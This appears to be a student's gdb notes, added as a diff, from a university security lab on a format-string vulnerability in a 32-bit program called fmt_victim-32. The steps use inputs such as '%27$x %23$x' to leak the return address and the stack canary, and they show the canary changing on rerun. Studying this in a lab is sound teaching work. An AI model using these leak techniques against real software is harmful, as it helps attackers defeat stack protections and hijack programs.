@@ -1,0 +1,52 @@
+1. $ gdb fmt_victim-32
+2. (gdb) break main
+3. (gdb) run
+4. (gdb) disas
+    0x0804856e --> call test_fmts
+    0x08048573 --> return address of test_fmts
+5. (gdb) break *test_fmts
+    Breakpoint 2 at 0x804850e
+6. (gdb) c
+7. (gdb) x/128bx $esp
+    0xffffda1c:	0x73	0x85	0x04	0x08	0xdc	0xf3	0xfb	0xf7 --> return address of test_fmts
+8. (gdb) disas
+9. (gdb) break *0x08048537
+    Breakpoint 3 at 0x8048537 --> fgets in test_fmts
+10. (gdb) break *0x08048544
+    Breakpoint 4 at 0x8048544 --> after printf in test_fmts
+11. (gdb) c
+    Continuing.
+    Enter string: %27$x
+    8048573
+
+    Breakpoint 4, 0x08048544 in test_fmts ()
+12. (gdb) si
+    0x0804854b in test_fmts ()
+13. (gdb) info registers $eax
+    eax            0x97822700	-1753078016 --> canary
+14. (gdb) x/128bw $esp
+    0xffffda00:	0x00000001	0x00000000	0xf7e3aa60	0x97822700
+    0xffffda10:	0x00000001	0xffffdad4	0xffffdadc	0x08048573 --> canary is 4 bytes away from return address of test_fmts
+15. (gdb) run
+    The program being debugged has been started already.
+    Start it from the beginning? (y or n) y
+    Starting program: /home/dtrived5/CS-576-Fall-2020/lab07/exercise/fmt_victim-32 
+
+    Breakpoint 1, 0x0804856b in main ()
+16. (gdb) c
+17. (gdb) c
+    Continuing.
+    Enter string: %27$x %23$x
+    8048573 be2a9500
+
+    Breakpoint 4, 0x08048544 in test_fmts ()
+18. (gdb) c
+    Continuing.
+
+    Breakpoint 5, 0x0804854b in test_fmts ()
+19. (gdb) info registers $eax
+    eax            0xbe2a9500	-1104505600 --> new canary as program was rerun
+20. (gdb) x/128bw $esp
+    0xffffda00:	0x00000001	0x00000000	0xf7e3aa60	0xbe2a9500
+    0xffffda10:	0x00000001	0xffffdad4	0xffffdadc	0x08048573
+21. (gdb) quit
